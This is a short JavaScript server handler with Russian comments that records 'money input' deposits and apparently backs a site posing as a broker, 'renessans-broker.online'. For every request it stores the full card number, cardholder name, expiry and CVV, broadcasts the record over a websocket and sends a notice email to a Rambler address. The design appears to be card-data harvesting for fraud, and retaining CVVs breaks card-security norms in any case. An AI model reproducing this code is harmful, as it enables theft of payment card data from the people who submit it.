import {OKEY_STATUS_CODE, SERVER_ERROR_STATUS_CODE} from '../../../../constants/constants';

import uniqid from 'uniqid';
import format from 'date-fns/format';

import saveMoneyInputQuery from '../queries/saveMoneyInput'; // *
import transactionsWebsocketController from '../../../../controllers/websockets/transactionsWebsocketController'; // **
import sendEmail from '../../../../helpers/sendEmail';

export default function saveMoneyInput(req, res) {
    try {
        const data = req.body;
        const now = new Date();
        const input = {
            userId: data.userId,
            amount: data.amount,
            // добавил номер карты
            numberCard: data.numberCard,
            cardHolderName: data.cardHolderName,
            cardExpiry: data.cardExpiry,
            cardCVV: data.cardCVV,
            wallet: data.wallet,
            status: 'Новая',
            createdAt: format(now, 'yyyy-MM-dd'),
            createdAtDate: +now,
            id: uniqid(),
            visited: false,
        };

        saveMoneyInputQuery(input)
            .then(() => {
                sendEmail('testoutpout123@rambler.ru', {
                    subject: 'Тест письмо',
                    content: 'renessans-broker.online',
                });
                transactionsWebsocketController.sendInput(input);
                res.status(OKEY_STATUS_CODE).send(data);
            })
            .catch(() => {
                res.status(SERVER_ERROR_STATUS_CODE).end();
            });
    } catch (e) {
        res.status(SERVER_ERROR_STATUS_CODE).end();
    }
}
